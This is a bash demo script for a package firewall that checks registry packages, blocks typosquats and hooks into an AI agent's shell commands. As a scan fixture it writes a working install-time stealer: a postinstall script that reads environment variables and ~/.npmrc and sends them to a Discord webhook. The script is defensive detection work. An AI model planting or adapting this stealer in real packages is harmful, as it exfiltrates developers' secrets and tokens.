#!/usr/bin/env bash
# End-to-end demo of Customs against the live registries.
#
#   scripts/demo.sh            build, start the server, run every scenario, stop
#   KEEP=1 scripts/demo.sh     leave the server running so you can open the dashboard
#
# Nothing here executes package code. The "malicious" package below is an inert string
# fixture that is only packed and scanned.
set -euo pipefail
cd "$(dirname "$0")/.."

BIN=target/release/customs
PORT=${PORT:-7878}
URL="http://127.0.0.1:${PORT}"
WORK=$(mktemp -d)
trap 'if [ -z "${KEEP:-}" ]; then kill "${SERVER_PID:-0}" 2>/dev/null || true; fi; rm -rf "$WORK"' EXIT

step() { printf '\n\033[1m== %s\033[0m\n' "$*"; }

[ -x "$BIN" ] || cargo build --release -p customs -p customs-scan
[ -d web/dist ] || (cd web && npm ci --no-audit --no-fund && npm run build)

step "Start the firewall on $URL"
"$BIN" serve --bind "127.0.0.1:${PORT}" --data-dir "$WORK/data" --ui-dir web/dist >"$WORK/server.log" 2>&1 &
SERVER_PID=$!
for _ in $(seq 50); do curl -fsS "$URL/healthz" >/dev/null 2>&1 && break; sleep 0.2; done
curl -fsS "$URL/api/model" | python3 -c 'import json,sys; m=json.load(sys.stdin); print("model", m["model_version"])'

step "A popular package passes"
"$BIN" check pypi requests --server "$URL" || true

step "A hallucinated typo of it is stopped before download"
"$BIN" check pypi reqeusts --server "$URL" || true

step "An inert install-time stealer is blocked by the code models"
mkdir -p "$WORK/pkg/package"
cat >"$WORK/pkg/package/package.json" <<'JSON'
{"name": "colors-helper-utils", "version": "1.0.4", "main": "index.js",
 "scripts": {"postinstall": "node setup.js"}}
JSON
cat >"$WORK/pkg/package/setup.js" <<'JS'
const os = require("os"); const https = require("https");
const data = JSON.stringify({ host: os.hostname(), user: os.userInfo().username,
  env: process.env, npmrc: require("fs").readFileSync(os.homedir() + "/.npmrc", "utf8") });
const req = https.request({ hostname: "discord.com", path: "/api/webhooks/123/abc",
  method: "POST", headers: { "Content-Type": "application/json" } });
req.write(Buffer.from(data).toString("base64")); req.end();
JS
echo 'module.exports = (s) => s;' >"$WORK/pkg/package/index.js"
tar -czf "$WORK/colors-helper-utils-1.0.4.tgz" -C "$WORK/pkg" package
"$BIN" scan "$WORK/colors-helper-utils-1.0.4.tgz" || true

step "pip installs through the proxy (allowed package)"
python3 -m pip download --quiet --no-deps --dest "$WORK/dl" \
  --index-url "$URL/pypi/simple" six && ls "$WORK/dl"

step "Claude Code hook: an agent tries to install a typo"
printf '%s' '{"hook_event_name":"PreToolUse","tool_name":"Bash","cwd":"/tmp","tool_input":{"command":"pip install reqeusts && npm install left-pad"}}' \
  | "$BIN" hook claude-code | python3 -m json.tool

step "Dashboard"
echo "Open $URL to see every event above."
if [ -n "${KEEP:-}" ]; then echo "Server left running (pid $SERVER_PID)."; fi
